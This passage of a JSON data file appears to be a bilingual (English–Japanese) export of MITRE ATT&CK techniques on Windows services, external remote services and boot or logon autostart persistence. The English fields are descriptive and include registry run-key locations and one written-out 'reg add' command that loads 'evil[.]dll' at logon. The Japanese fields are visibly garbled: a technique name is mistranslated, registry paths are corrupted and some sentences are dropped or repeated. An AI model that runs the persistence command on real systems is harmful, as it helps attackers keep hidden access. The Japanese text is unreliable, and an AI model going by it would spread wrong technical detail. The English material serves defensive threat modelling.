service Registry values (i.e. [Modify Registry](https://attack.mitre.org/techniques/T1112)), or by using command-line utilities such as `PnPUtil.exe`.(Citation: Symantec W.32 Stuxnet Dossier)(Citation: Crowdstrike DriveSlayer February 2022)(Citation: Unit42 AcidBox June 2020) Adversaries may leverage these drivers as [Rootkit](https://attack.mitre.org/techniques/T1014)s to hide the presence of malicious activity on a system. Adversaries may also load a signed yet vulnerable driver onto a compromised machine (known as \"Bring Your Own Vulnerable Driver\" (BYOVD)) as part of [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068).(Citation: ESET InvisiMole June 2020)(Citation: Unit42 AcidBox June 2020)\n\nServices may be created with administrator privileges but are executed under SYSTEM privileges, so an adversary may also use a service to escalate privileges. Adversaries may also directly start services through [Service Execution](https://attack.mitre.org/techniques/T1569/002).\n\nTo make detection analysis more challenging, malicious services may also incorporate [Masquerade Task or Service](https://attack.mitre.org/techniques/T1036/004) (ex: using a service and/or payload name related to a legitimate OS or benign software component). Adversaries may also create ‘hidden’ services (i.e., [Hide Artifacts](https://attack.mitre.org/techniques/T1564)), for example by using the `sc sdset` command to set service permissions via the Service Descriptor Definition Language (SDDL). This may hide a Windows service from the view of standard service enumeration methods such as `Get-Service`, `sc query`, and `services.exe`.(Citation: SANS 1)(Citation: SANS 2)",
                        "description_jp": "攻撃者は、永続化の一環として悪意のあるペイロードを繰り返し実行するために、Windowsサービスを作成または変更する可能性がある。Windowsが起動すると、バックグラウンドのシステム機能を実行するサービスと呼ばれるプログラムやアプリケーションが起動する（引用：TechNet Services）。サービスの実行ファイルや回復プログラム/コマンドへのファイルパスを含むWindowsサービス構成情報は、Windowsレジストリに保存される。\n\n攻撃者は、システム上で持続するために、新しいサービスをインストールしたり、既存のサービスを変更して起動時に実行したりする可能性がある。サービスコンフィギュレーションは、システムユーティリティ（sc.exeなど）を使用するか、レジストリを直接変更するか、Windows APIと直接やりとりすることで設定または変更できる。\n\n攻撃者はまた、サービスを使って悪意のあるドライバーをインストールし、実行することもある。例えば、ドライバファイル(ex: `.sys`)をディスクにドロップした後、`CreateServiceW()`のような[Native API](https://attack.mitre.org/techniques/T1106)関数(または `ZwLoadDriver()`や`ZwSetValueKey()`のような関数を介して手動で)、必要なサービスレジストリ値を作成することによって、ペイロードをロードして登録することができる。レジストリの変更](https://attack.mitre.org/techniques/T1112) などの関数を使用するか、`PnPUtil.exe` などのコマンドラインユーティリティを使用します。Stuxnet Dossier)(Citation: Crowdstrike DriveSlayer February 2022)(Citation: Unit42 AcidBox June 2020) 敵対者は、これらのドライバを[Rootkit](https://attack.mitre.org/techniques/T1014)として活用し、システム上の悪意のある活動の存在を隠す可能性があります。攻撃者はまた、[Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068)の一環として、署名済みでありながら脆弱なドライバを侵害されたマシンにロードする可能性があります(「Bring Your Own Vulnerable Driver」(BYOVD)として知られています)(引用: ESET InvisiMole 2020年6月)(引用: Unit42 AcidBox 2020年6月)\n\nサービスは管理者権限で作成されますが、SYSTEM権限で実行されるため、敵は特権をエスカレートさせるためにサービスを使用する可能性もあります。また、敵は[Service Execution](https://attack.mitre.org/techniques/T1569/002)を通じてサービスを直接起動することもできます。\n\n検出分析をより困難にするために、悪意のあるサービスは[マスカレードタスクまたはサービス](https://attack.mitre.org/techniques/T1036/004)(例: 正規のOSまたは良性のソフトウェアコンポーネントに関連するサービス名および/またはペイロード名を使用)を組み込むこともあります。例えば、`sc sdset` コマンドを使用して、Service Descriptor Definition Language (SDDL) 経由でサービスのパーミッションを設定します。これは、`Get-Service`、`sc query`、`services.exe`などの標準的なサービス列挙メソッドの視界からWindowsサービスを隠す可能性がある（引用：SANS 1）（引用：SANS 2）。"
                    }
                ]
            },
            {
                "id": "T1133",
                "name_eng": "External Remote Services",
                "name_jp": "外部リモートサービス",
                "description_eng": "Adversaries may leverage external-facing remote services to initially access and/or persist within a network. Remote services such as VPNs, Citrix, and other access mechanisms allow users to connect to internal enterprise network resources from external locations. There are often remote service gateways that manage connections and credential authentication for these services. Services such as [Windows Remote Management](https://attack.mitre.org/techniques/T1021/006) and [VNC](https://attack.mitre.org/techniques/T1021/005) can also be used externally.(Citation: MacOS VNC software for Remote Desktop)\n\nAccess to [Valid Accounts](https://attack.mitre.org/techniques/T1078) to use the service is often a requirement, which could be obtained through credential pharming or by obtaining the credentials from users after compromising the enterprise network.(Citation: Volexity Virtual Private Keylogging) Access to remote services may be used as a redundant or persistent access mechanism during an operation.\n\nAccess may also be gained through an exposed service that doesn’t require authentication. In containerized environments, this may include an exposed Docker API, Kubernetes API server, kubelet, or web application such as the Kubernetes dashboard.(Citation: Trend Micro Exposed Docker Server)(Citation: Unit 42 Hildegard Malware)",
                "description_jp": "攻撃者は、外部向けのリモートサービスを利用して、最初にネットワークにアクセスしたり、ネットワーク内に留まったりすることがあります。VPN、Citrix、およびその他のアクセス・メカニズムなどのリモート・サービスは、ユーザが外部ロケーションから内部エンタープライズ・ネットワーク・リソースに接続することを可能にする。多くの場合、これらのサービスの接続とクレデンシャル認証を管理するリモートサービスゲートウェイがある。Windowsリモート管理](https://attack.mitre.org/techniques/T1021/006)や[VNC](https://attack.mitre.org/techniques/T1021/005)などのサービスも外部から利用できる。(引用：リモートデスクトップ用MacOS VNCソフトウェア)\n\nサービスを使用するための[有効なアカウント](https://attack.mitre.org/techniques/T1078)へのアクセスは、多くの場合必要条件である。これは、クレデンシャル・ファーミングによって取得されるか、企業ネットワークを侵害した後にユーザーからクレデンシャルを取得することによって取得される可能性がある。(引用：Volexity Virtual Private Keylogging) リモートサービスへのアクセスは、運用中の冗長的または永続的なアクセスメカニズムとして使用されることがある。\n\nまた、認証を必要としない公開サービスを通じてアクセスすることもある。コンテナ化された環境では、公開されたDocker API、Kubernetes APIサーバ、kubelet、またはKubernetesダッシュボードのようなWebアプリケーションなどがこれに該当します(引用: Trend Micro Exposed Docker Server)(引用: Unit 42 Hildegard Malware)",
                "subtechniques": []
            },
            {
                "id": "T1547",
                "name_eng": "Boot or Logon Autostart Execution",
                "name_jp": "ブートまたはログオンの自動開始実行",
                "description_eng": "Adversaries may configure system settings to automatically execute a program during system boot or logon to maintain persistence or gain higher-level privileges on compromised systems. Operating systems may have mechanisms for automatically running a program on system boot or account logon.(Citation: Microsoft Run Key)(Citation: MSDN Authentication Packages)(Citation: Microsoft TimeProvider)(Citation: Cylance Reg Persistence Sept 2013)(Citation: Linux Kernel Programming) These mechanisms may include automatically executing programs that are placed in specially designated directories or are referenced by repositories that store configuration information, such as the Windows Registry. An adversary may achieve the same goal by modifying or extending features of the kernel.\n\nSince some boot or logon autostart programs run with higher privileges, an adversary may leverage these to elevate privileges.",
                "description_jp": "攻撃者は、侵害されたシステム上で永続性を維持したり、より高いレベルの特権を獲得したりするために、システムの起動時やログオン時にプログラムを自動的に実行するようにシステム設定を構成することがあります。オペレーティングシステムは、システムブート時またはアカウントログオン時にプログラムを自動的に実行するメカニズムを備えている場合があります（引用：Microsoft Run Key）（引用：MSDN Authentication Packages）（引用：Microsoft TimeProvider）（引用：Cylance Reg Persistence Sept 2013）（引用：Linux Kernel Programming）これらのメカニズムには、特別に指定されたディレクトリに配置されたプログラムを自動的に実行したり、Windowsレジストリなどの構成情報を格納するリポジトリから参照されたりする場合があります。敵対者は、カーネルの機能を変更または拡張することで、同じ目標を達成することができる。\n\nブートやログオンの自動起動プログラムの中には、より高い特権で実行されるものがあるため、敵対者はこれらを利用して特権を昇格させる可能性がある。",
                "subtechniques": [
                    {
                        "id": "T1547.009",
                        "name_eng": "Shortcut Modification",
                        "name_jp": "ショートカットの変更",
                        "description_eng": "Adversaries may create or modify shortcuts that can execute a program during system boot or user login. Shortcuts or symbolic links are used to reference other files or programs that will be opened or executed when the shortcut is clicked or executed by a system startup process.\n\nAdversaries may abuse shortcuts in the startup folder to execute their tools and achieve persistence.(Citation: Shortcut for Persistence ) Although often used as payloads in an infection chain (e.g. [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001)), adversaries may also create a new shortcut as a means of indirection, while also abusing [Masquerading](https://attack.mitre.org/techniques/T1036) to make the malicious shortcut appear as a legitimate program. Adversaries can also edit the target path or entirely replace an existing shortcut so their malware will be executed instead of the intended legitimate program.\n\nShortcuts can also be abused to establish persistence by implementing other methods. For example, LNK browser extensions may be modified (e.g. [Browser Extensions](https://attack.mitre.org/techniques/T1176/001)) to persistently launch malware.",
                        "description_jp": "攻撃者は、システム起動中やユーザーログイン中にプログラムを実行できるショートカットを作成または変更する可能性があります。ショートカットやシンボリックリンクは、そのショートカットがクリックされたり、システムの起動プロセスで実行されたりしたときに開かれたり実行されたりする他のファイルやプログラムを参照するために使用されます。\n\n攻撃者は、スタートアップフォルダ内のショートカットを悪用してツールを実行し、持続性を実現することがあります。(引用: 持続性を実現するショートカット) 感染チェーンのペイロードとして使用されることもよくありますが (例: [Spearphishing Attachment] (https://attack.mitre.org/techniques/T1566/001))、攻撃者は、間接的な手段として新しいショートカットを作成することもあります。また、[Masquerading](https://attack.mitre.org/techniques/T1036) を悪用して、悪意のあるショートカットを正規のプログラムのように見せることもあります。また、標的のパスを編集したり、既存のショートカットを完全に置き換えたりすることで、意図した正規プログラムの代わりにマルウェアを実行させることも可能です。\n\nまた、ショートカットを悪用して、他の方法を実装することで永続性を確立することも可能です。たとえば、LNKブラウザの拡張機能を変更して（[ブラウザ拡張機能](https://attack.mitre.org/techniques/T1176/001)など）、マルウェアを持続的に起動させることができます。"
                    },
                    {
                        "id": "T1547.006",
                        "name_eng": "Kernel Modules and Extensions",
                        "name_jp": "カーネルモジュールと拡張機能",
                        "description_eng": "Adversaries may modify the kernel to automatically execute programs on system boot. Loadable Kernel Modules (LKMs) are pieces of code that can be loaded and unloaded into the kernel upon demand. They extend the functionality of the kernel without the need to reboot the system. For example, one type of module is the device driver, which allows the kernel to access hardware connected to the system.(Citation: Linux Kernel Programming) \n\nWhen used maliciously, LKMs can be a type of kernel-mode [Rootkit](https://attack.mitre.org/techniques/T1014) that run with the highest operating system privilege (Ring 0).(Citation: Linux Kernel Module Programming Guide) Common features of LKM based rootkits include: hiding itself, selective hiding of files, processes and network activity, as well as log tampering, providing authenticated backdoors, and enabling root access to non-privileged users.(Citation: iDefense Rootkit Overview)\n\nKernel extensions, also called kext, are used in macOS to load functionality onto a system similar to LKMs for Linux. Since the kernel is responsible for enforcing security and the kernel extensions run as apart of the kernel, kexts are not governed by macOS security policies. Kexts are loaded and unloaded through <code>kextload</code> and <code>kextunload</code> commands. Kexts need to be signed with a developer ID that is granted privileges by Apple allowing it to sign Kernel extensions. Developers without these privileges may still sign kexts but they will not load unless SIP is disabled. If SIP is enabled, the kext signature is verified before being added to the AuxKC.(Citation: System and kernel extensions in macOS)\n\nSince macOS Catalina 10.15, kernel extensions have been deprecated in favor of System Extensions. However, kexts are still allowed as \"Legacy System Extensions\" since there is no System Extension for Kernel Programming Interfaces.(Citation: Apple Kernel Extension Deprecation)\n\nAdversaries can use LKMs and kexts to conduct [Persistence](https://attack.mitre.org/tactics/TA0003) and/or [Privilege Escalation](https://attack.mitre.org/tactics/TA0004) on a system. Examples have been found in the wild, and there are some relevant open source projects as well.(Citation: Volatility Phalanx2)(Citation: CrowdStrike Linux Rootkit)(Citation: GitHub Reptile)(Citation: GitHub Diamorphine)(Citation: RSAC 2015 San Francisco Patrick Wardle)(Citation: Synack Secure Kernel Extension Broken)(Citation: Securelist Ventir)(Citation: Trend Micro Skidmap)",
                        "description_jp": "攻撃者は、システム起動時に自動的にプログラムを実行するようにカーネルを変更する可能性があります。ローダブルカーネルモジュール（LKM）は、要求に応じてカーネルにロードしたりアンロードしたりできるコードの断片です。システムを再起動することなく、カーネルの機能を拡張します。例えば、モジュールの一種にデバイス・ドライバがあり、カーネルがシステムに接続されたハードウェアにアクセスできるようにする。 引用：Linuxカーネル・プログラミング\n\n悪意を持って使用された場合、LKMはカーネルモード[ルートキット](https://attack.mitre.org/techniques/T1014)の一種となり、オペレーティングシステムの最高権限(Ring 0)で実行されます(引用: Linux Kernel Module Programming Guide)。LKMベースのルートキットの一般的な機能には、自身を隠すこと、ファイル、プロセス、ネットワーク活動の選択的な非表示、およびログの改ざん、認証済みのバックドアの提供、非特権ユーザーへのルートアクセスの有効化などがあります(引用: iDefense Rootkit Overview)。\n\nkextとも呼ばれるカーネル拡張機能は、LinuxのLKMと同様にシステムに機能をロードするためにmacOSで使用されます。カーネルはセキュリティを実施する責任があり、カーネル拡張機能はカーネルの一部として実行されるため、kextはmacOSのセキュリティポリシーに支配されません。Kextsは<code>kextload</code>と<code>kextunload</code>コマンドでロードとアンロードを行います。Kext は、Apple からカーネル拡張に署名できる権限を与えられた開発者 ID で署名する必要があります。これらの権限を持たない開発者でもkextに署名することはできますが、SIPが無効になっていない限りロードされません。SIPが有効になっている場合、kextの署名はAuxKCに追加される前に検証されます。(引用: macOSにおけるシステムとカーネル拡張)\n\nmacOS Catalina 10.15以降、カーネル拡張機能は廃止され、システム拡張機能が使用されるようになりました。しかし、カーネルプログラミングインタフェースのシステム拡張がないため、kextは「レガシーシステム拡張」として許可されています。\n\n攻撃者は LKM と kext を使って、システム上で [Persistence](https://attack.mitre.org/tactics/TA0003) や [Privilege Escalation](https://attack.mitre.org/tactics/TA0004) を行うことができます。例としては、Volatility Phalanx2)(引用: CrowdStrike Linux Rootkit)(引用: GitHub Reptile)(引用: GitHub Diamorphine)(引用: RSAC 2015 San Francisco Patrick Wardle)(引用: Synack Secure Kernel Extension Broken)(引用: Securelist Ventir)(引用: Trend Micro Skidmap)"
                    },
                    {
                        "id": "T1547.007",
                        "name_eng": "Re-opened Applications",
                        "name_jp": "再募集",
                        "description_eng": "Adversaries may modify plist files to automatically run an application when a user logs in. When a user logs out or restarts via the macOS Graphical User Interface (GUI), a prompt is provided to the user with a checkbox to \"Reopen windows when logging back in\".(Citation: Re-Open windows on Mac) When selected, all applications currently open are added to a property list file named <code>com.apple.loginwindow.[UUID].plist</code> within the <code>~/Library/Preferences/ByHost</code> directory.(Citation: Methods of Mac Malware Persistence)(Citation: Wardle Persistence Chapter) Applications listed in this file are automatically reopened upon the user’s next logon.\n\nAdversaries can establish [Persistence](https://attack.mitre.org/tactics/TA0003) by adding a malicious application path to the <code>com.apple.loginwindow.[UUID].plist</code> file to execute payloads when a user logs in.",
                        "description_jp": "攻撃者は、ユーザーがログインしたときに自動的にアプリケーションを実行するようにplistファイルを変更する可能性がある。ユーザーがmacOSのグラフィカル・ユーザー・インターフェース（GUI）を使ってログアウトまたは再起動すると、「再ログイン時にウィンドウを開き直す」というチェックボックスが付いたプロンプトが表示される（引用：Re-Open windows on Mac）。apple.loginwindow.[UUID].plist<//code>という名前のプロパティ リスト ファイルに追加されます。(引用: Mac マルウェア永続化の方法)(引用: Wardle 永続化の章) このファイルにリストされているアプリケーションは、ユーザーの次のログオン時に自動的に再開されます。\n\n攻撃者は、<code>com.apple.loginwindow.[UUID].plist</code>ファイルに悪意のあるアプリケーションのパスを追加することで、[Persistence](https://attack.mitre.org/tactics/TA0003)を確立し、ユーザーがログインしたときにペイロードを実行することができます。"
                    },
                    {
                        "id": "T1547.004",
                        "name_eng": "Winlogon Helper DLL",
                        "name_jp": "ウィンログオンヘルパーDLL",
                        "description_eng": "Adversaries may abuse features of Winlogon to execute DLLs and/or executables when a user logs in. Winlogon.exe is a Windows component responsible for actions at logon/logoff as well as the secure attention sequence (SAS) triggered by Ctrl-Alt-Delete. Registry entries in <code>HKLM\\Software[\\\\Wow6432Node\\\\]\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\</code> and <code>HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\</code> are used to manage additional helper programs and functionalities that support Winlogon.(Citation: Cylance Reg Persistence Sept 2013) \n\nMalicious modifications to these Registry keys may cause Winlogon to load and execute malicious DLLs and/or executables. Specifically, the following subkeys have been known to be possibly vulnerable to abuse: (Citation: Cylance Reg Persistence Sept 2013)\n\n* Winlogon\\Notify - points to notification package DLLs that handle Winlogon events\n* Winlogon\\Userinit - points to userinit.exe, the user initialization program executed when a user logs on\n* Winlogon\\Shell - points to explorer.exe, the system shell executed when a user logs on\n\nAdversaries may take advantage of these features to repeatedly execute malicious code and establish persistence.",
                        "description_jp": "攻撃者はWinlogonの機能を悪用し、ユーザーがログインした際にDLLや実行ファイルを実行する可能性がある。Winlogon.exe は、ログオン/ログオフ時のアクションや、Ctrl-Alt-Delete によってトリガーされるセキュア アテンション シーケンス (SAS) を担当する Windows コンポーネントです。<code>HKLMSoftware[◆Wow6432Node]◆MicrosoftWindows NTCurrentVersion</code>と<code>HKCUSoftware</code>のレジストリエントリは、Winlogonをサポートする追加のヘルパープログラムと機能を管理するために使用される(Citation: Cylance Reg Persistence Sept 2013)\n\nこれらのレジストリキーに悪意のある変更を加えると、Winlogonが悪意のあるDLLや実行可能ファイルをロードして実行する可能性があります。具体的には、以下のサブキーが悪用される可能性があることが知られています: (引用: Cylance Reg Persistence Sept 2013)\n\n* WinlogonNotify - Winlogonイベントを処理する通知パッケージDLLを指す。\n* WinlogonUserinit - userinit.exe（ユーザがログオンしたときに実行されるユーザ初期化プログラム）を指す。\n* WinlogonShell - explorer.exe（ユーザがログオンしたときに実行されるシス テムシェル）を指す。\n\nWinlogonShell-ユーザがログオンしたときに実行されるシステム・シェルであるexplorer.exeを指す。"
                    },
                    {
                        "id": "T1547.005",
                        "name_eng": "Security Support Provider",
                        "name_jp": "セキュリティ・サポート・プロバイダー",
                        "description_eng": "Adversaries may abuse security support providers (SSPs) to execute DLLs when the system boots. Windows SSP DLLs are loaded into the Local Security Authority (LSA) process at system start. Once loaded into the LSA, SSP DLLs have access to encrypted and plaintext passwords that are stored in Windows, such as any logged-on user's Domain password or smart card PINs.\n\nThe SSP configuration is stored in two Registry keys: <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Security Packages</code> and <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\OSConfig\\Security Packages</code>. An adversary may modify these Registry keys to add new SSPs, which will be loaded the next time the system boots, or when the AddSecurityPackage Windows API function is called.(Citation: Graeber 2014)",
                        "description_jp": "攻撃者は、セキュリティサポートプロバイダ（SSP）を悪用して、システム起動時に DLL を実行する可能性がある。WindowsのSSP DLLは、システム起動時にローカルセキュリティオーソリティ（LSA）プロセスにロードされる。LSA にロードされると、SSP DLL は、ログオンしているユーザーのドメイン・パスワードやスマート・カードの PIN など、Windows に保存されている暗号化されたパスワードや平文のパスワードにアクセスできるようになる。\n\nSSP 構成は、2つのレジストリ・キーに格納される：<Code>HKLMSYSTEM\\CurrentControlSetControlLsaSecurity Packages</code> と <Code>HKLMSYSTEM\\CurrentControlSetControlLsaOSConfig\\Security Packages</code> である。敵対者は、これらのレジストリ・キーを変更して新しいSSPを追加し、次回システム起動時、またはAddSecurityPackage Windows API関数が呼び出されたときにロードする可能性がある(Citation: Graeber 2014)。"
                    },
                    {
                        "id": "T1547.001",
                        "name_eng": "Registry Run Keys / Startup Folder",
                        "name_jp": "レジストリの実行キー / スタートアップフォルダ",
                        "description_eng": "Adversaries may achieve persistence by adding a program to a startup folder or referencing it with a Registry run key. Adding an entry to the \"run keys\" in the Registry or startup folder will cause the program referenced to be executed when a user logs in.(Citation: Microsoft Run Key) These programs will be executed under the context of the user and will have the account's associated permissions level.\n\nThe following run keys are created by default on Windows systems:\n\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce</code>\n\nRun keys may exist under multiple hives.(Citation: Microsoft Wow6432Node 2018)(Citation: Malwarebytes Wow6432Node 2016) The <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx</code> is also available but is not created by default on Windows Vista and newer. Registry run key entries can reference programs directly or list them as a dependency.(Citation: Microsoft Run Key) For example, it is possible to load a DLL at logon using a \"Depend\" key with RunOnceEx: <code>reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d \"C:\\temp\\evil[.]dll\"</code> (Citation: Oddvar Moe RunOnceEx Mar 2018)\n\nPlacing a program within a startup folder will also cause that program to execute when a user logs in. There is a startup folder location for individual user accounts as well as a system-wide startup folder that will be checked regardless of which user account logs in. The startup folder path for the current user is <code>C:\\Users\\\\[Username]\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup</code>. The startup folder path for all users is <code>C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp</code>.\n\nThe following Registry keys can be used to set startup folder items for persistence:\n\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders</code>\n* <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders</code>\n* <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders</code>\n\nThe following Registry keys can control automatic startup of services during boot:\n\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices</code>\n\nUsing policy settings to specify startup programs creates corresponding values in either of two Registry keys:\n\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run</code>\n\nPrograms listed in the load value of the registry key <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows</code> run automatically for the currently logged-on user.\n\nBy default, the multistring <code>BootExecute</code> value of the registry key <code>HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager</code> is set to <code>autocheck autochk *</code>. This value causes Windows, at startup, to check the file-system integrity of the hard disks if the system has been shut down abnormally. Adversaries can add other programs or processes to this registry value which will automatically launch at boot.\n\nAdversaries can use these configuration locations to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use [Masquerading](https://attack.mitre.org/techniques/T1036) to make the Registry entries look as if they are associated with legitimate programs.",
                        "description_jp": "攻撃者は、プログラムをスタートアップフォルダに追加したり、レジストリのランキーで参照したりすることで、永続性を実現することができる。レジストリまたはスタートアップフォルダの「実行キー」にエントリを追加すると、ユーザーがログインしたときに参照されたプログラムが実行されるようになる（引用：Microsoft Run Key）。\n\nWindowsシステムでは、以下のランキーがデフォルトで作成される：\n\n* <code>HKEY_CURRENT_USERSoftwareMicrosoftWindows\\CurrentVersion\\Run</code>\n* <code>HKEY_CURRENT_USER\\SoftwareMicrosoftWindows\\CurrentVersionRunOnce</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\MicrosoftWindows\\CurrentVersion</code>Run</code>\n* <code>HKEY_LOCAL_MACHINE_Software\\MicrosoftWindows\\CurrentVersion\\RunOnce</code>\n\nランキーは複数のハイブの下に存在する可能性があります。(引用: Microsoft Wow6432Node 2018)(引用: Malwarebytes Wow6432Node 2016) <code>HKEY_LOCAL_MACHINE\\SoftwareMicrosoftWindows\\CurrentVersionRunOnceEx</code> も利用可能ですが、Windows Vista以降ではデフォルトでは作成されません。レジストリのランキーエントリは、プログラムを直接参照することも、依存関係としてリストすることもできます。 引用：Microsoft Run Key） 例えば、RunOnceExで「Depend」キーを使用してログオン時にDLLをロードすることが可能です：<code>reg add HKLMSOFTWARE\\MicrosoftWindowsCurrentVersionRunOnceEx0001Depend /v 1 /d \"C:゙temp\\evil[.]dll\"</code> （引用：Oddvar Moe RunOnceEx 2018年3月号\n\nスタートアップフォルダ内にプログラムを配置すると、ユーザーがログインしたときにそのプログラムが実行されるようにもなる。個々のユーザーアカウント用のスタートアップフォルダーの場所と、どのユーザーアカウントがログインしてもチェックされるシステム全体のスタートアップフォルダーがあります。現在のユーザーのスタートアップフォルダのパスは<code>C:¥Users¥Username¥AppData¥Roaming¥Microsoft¥Windows¥Start Menu¥ProgramsStartup</code>である。全ユーザのスタートアップフォルダのパスは<code>C:¥ProgramData¥Microsoft¥Windows¥Start Menu¥Programs¥StartUp</code>です。\n\n以下のレジストリ・キーを使用して、永続化するスタートアップ・フォルダ項目を設定できます：\n\n<code>HKEY_CURRENT_USER\\SoftwareMicrosoftWindows\\CurrentVersion\\Explorer\\User Shell Folders</code>\n* <code>HKEY_CURRENT_USER\\SoftwareMicrosoftWindows\\CurrentVersionExplorer\\Shell Folders</code>\n* <code>HKEY_LOCAL_MACHINE\\SOFTWAREMicrosoftWindows\\CurrentVersion ReplicaShell Folders</code>\n* <code>HKEY_LOCAL_MACHINE ProxySOFTWARE</code> * <code>HKEY_LOCAL_MACHINE ProxySOFTWARE</code> * <code>HKEY_LOCAL_MACHINE ProxySOFTWARE</code\n\n以下のレジストリキーは、ブート時のサービスの自動起動を制御できます：\n\n<code>HKEY_LOCAL_MACHINE\\SoftwareMicrosoftWindows\\CurrentVersion\\RunServicesOnce</code>\n* <code>HKEY_CURRENT_USERソフトウェアの章\n* <code>HKEY_LOCAL_MACHINE\\SoftwareMicrosoftWindows\\CurrentVersionRunServices</code>\n* <code>HKEY_CURRENT_USER\\SoftwareMicrosoftWindows\\CurrentVersion\\RunServices</code>\n\nポリシー設定を使用してスタートアップ プログラムを指定すると、2 つのレジストリ キーのいずれかに対応する値が作成されます：\n\n<code>HKEY_LOCAL_MACHINE\\SoftwareMicrosoftWindowsCurrentVersion\\Policies\\Explorer\\Run</code>\n<code>HKEY_CURRENT_USER Software\\MicrosoftWindows\\CurrentVersion\\Policies\\Explorer</Run</code>\n\nレジストリキー<code>HKEY_CURRENT_USER</code>のロード値にリストされているプログラムは、現在ログオンしているユーザーのために自動的に実行されます。\n\nデフォルトでは、レジストリ・キー<code>HKEY_LOCAL_MACHINE</code>の<code>BootExecute</code>値は<code>autocheck autochk *</code>に設定されています。この値は、システムが異常にシャットダウンされた場合、起動時にWindowsがハード ディスクのファイル システムの整合性をチェックするようにします。攻撃者は、起動時に自動的に起動する他のプログラムやプロセスを、このレジストリ値に追加することができる。\n\n攻撃者は、リモートアクセスツールなどのマルウェアを実行するために、これらの設定ロケーションを使用し、システムの再起動を通じて永続性を維持することができます。また、攻撃者は[Masquerading](https://attack.mitre.org/techniques/T1036)を使用して、レジストリエントリが正規のプログラムに関連付けられているかのように見せかけることもできます。"
                    },
                    {
                        "id": "T1547.008",
                        "name_eng": "LSASS Driver",
                        "name_jp": "LSASSドライバー",
                        "description_eng": "Adversaries may modify or add LSASS drivers to obtain persistence on compromised systems. The Windows security subsystem is a set of components that manage and enforce the security policy for a computer or domain. The Local Security Authority (LSA) is the main component responsible for local security policy and user authentication. The LSA includes multiple dynamic link libraries (DLLs) associated with various other security functions, all of which run in the context of the LSA Subsystem Service (LSASS) lsass.exe process.(Citation: Microsoft Security Subsystem)\n\nAdversaries may target LSASS drivers to obtain persistence. By either replacing or adding illegitimate drivers (e.g., [Hijack Execution Flow](https://attack.mitre.org/techniques/T1574)), an adversary can use LSA operations to continuously execute malicious payloads.",
                        "description_jp": "攻撃者はLSASSドライバを変更または追加して、侵害されたシステム上で永続性を得ることができる。Windowsセキュリティサブシステムは、コンピュータやドメインのセキュリティポリシーを管理・実施するコンポーネントの集合である。ローカルセキュリティオーソリティ（LSA）は、ローカルセキュリティポリシーとユーザー認証を担当する主要コンポーネントである。LSAには、他のさまざまなセキュリティ機能に関連する複数のダイナミックリンクライブラリ（DLL）が含まれており、これらはすべてLSAサブシステムサービス（LSASS）lsass.exeプロセスのコンテキストで実行される（引用：Microsoft Security Subsystem）。\n\n攻撃者は、LSASSドライバを標的として永続性を獲得する可能性があります。不正なドライバ(例えば、[Hijack Execution Flow](https://attack.mitre.org/techniques/T1574))を置き換えたり追加したりすることで、敵対者はLSAオペレーションを使用して悪意のあるペイロードを継続的に実行することができます。"
                    },
                    {
                        "id": "T1547.012",
                        "name_eng": "Print Processors",
                        "name_jp": "プリントプロセッサー",
                        "description_eng": "Adversaries may abuse print processors to run malicious DLLs during system boot for persistence and/or privilege escalation. Print processors are DLLs that are loaded by the print spooler service, `spoolsv.exe`, during boot.(Citation: Microsoft Intro Print Processors)\n\nAdversaries may abuse the print spooler service by adding print processors that load malicious DLLs at startup. A print processor can be installed through the <code>AddPrintProcessor</code> API call with an account that has <code>SeLoadDriverPrivilege</code> enabled. Alternatively, a print processor can be registered to the print spooler service by adding the <code>HKLM\\SYSTEM\\\\[CurrentControlSet or ControlSet001]\\Control\\Print\\Environments\\\\[Windows architecture: e.g., Windows x64]\\Print Processors\\\\[user defined]\\Driver</code> Registry key that points to the DLL.\n\nFor the malicious print processor to be correctly installed, the payload must be located in the dedicated system print-processor directory, that can be found with the <code>GetPrintProcessorDirectory</code> API call, or referenced via a relative path from this directory.(Citation: Microsoft AddPrintProcessor May 2018) After the print processors are installed, the print spooler 